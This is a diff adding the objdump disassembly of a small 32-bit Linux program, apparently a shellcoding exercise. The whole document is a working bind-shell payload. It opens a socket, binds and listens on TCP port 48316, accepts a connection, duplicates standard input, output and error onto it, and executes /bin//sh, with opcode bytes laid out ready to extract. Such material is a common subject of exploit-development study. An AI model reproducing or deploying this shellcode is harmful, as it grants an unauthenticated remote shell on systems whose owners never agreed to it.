@@ -1,0 +1,66 @@
+
+port_bind_asm_my_mods_test_by_section:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:	31 c0                	xor    %eax,%eax
+ 8048062:	31 db                	xor    %ebx,%ebx
+ 8048064:	31 d2                	xor    %edx,%edx
+ 8048066:	50                   	push   %eax
+ 8048067:	6a 01                	push   $0x1
+ 8048069:	6a 02                	push   $0x2
+ 804806b:	89 e1                	mov    %esp,%ecx
+ 804806d:	fe c3                	inc    %bl
+ 804806f:	b0 66                	mov    $0x66,%al
+ 8048071:	cd 80                	int    $0x80
+ 8048073:	89 c6                	mov    %eax,%esi
+ 8048075:	52                   	push   %edx
+ 8048076:	66 68 bc bb          	pushw  $0xbbbc
+ 804807a:	66 6a 02             	pushw  $0x2
+ 804807d:	89 e1                	mov    %esp,%ecx
+ 804807f:	6a 10                	push   $0x10
+ 8048081:	51                   	push   %ecx
+ 8048082:	56                   	push   %esi
+ 8048083:	89 e1                	mov    %esp,%ecx
+ 8048085:	43                   	inc    %ebx
+ 8048086:	31 c0                	xor    %eax,%eax
+ 8048088:	b0 66                	mov    $0x66,%al
+ 804808a:	cd 80                	int    $0x80
+ 804808c:	52                   	push   %edx
+ 804808d:	56                   	push   %esi
+ 804808e:	89 e1                	mov    %esp,%ecx
+ 8048090:	b3 04                	mov    $0x4,%bl
+ 8048092:	b0 66                	mov    $0x66,%al
+ 8048094:	cd 80                	int    $0x80
+ 8048096:	31 d2                	xor    %edx,%edx
+ 8048098:	52                   	push   %edx
+ 8048099:	52                   	push   %edx
+ 804809a:	56                   	push   %esi
+ 804809b:	89 e1                	mov    %esp,%ecx
+ 804809d:	43                   	inc    %ebx
+ 804809e:	31 c0                	xor    %eax,%eax
+ 80480a0:	b0 66                	mov    $0x66,%al
+ 80480a2:	cd 80                	int    $0x80
+ 80480a4:	89 c3                	mov    %eax,%ebx
+ 80480a6:	31 c9                	xor    %ecx,%ecx
+ 80480a8:	b0 3f                	mov    $0x3f,%al
+ 80480aa:	cd 80                	int    $0x80
+ 80480ac:	41                   	inc    %ecx
+ 80480ad:	b0 3f                	mov    $0x3f,%al
+ 80480af:	cd 80                	int    $0x80
+ 80480b1:	41                   	inc    %ecx
+ 80480b2:	b0 3f                	mov    $0x3f,%al
+ 80480b4:	cd 80                	int    $0x80
+ 80480b6:	31 c0                	xor    %eax,%eax
+ 80480b8:	50                   	push   %eax
+ 80480b9:	68 6e 2f 73 68       	push   $0x68732f6e
+ 80480be:	68 2f 2f 62 69       	push   $0x69622f2f
+ 80480c3:	89 e3                	mov    %esp,%ebx
+ 80480c5:	50                   	push   %eax
+ 80480c6:	53                   	push   %ebx
+ 80480c7:	89 e1                	mov    %esp,%ecx
+ 80480c9:	31 d2                	xor    %edx,%edx
+ 80480cb:	b0 0b                	mov    $0xb,%al
+ 80480cd:	cd 80                	int    $0x80
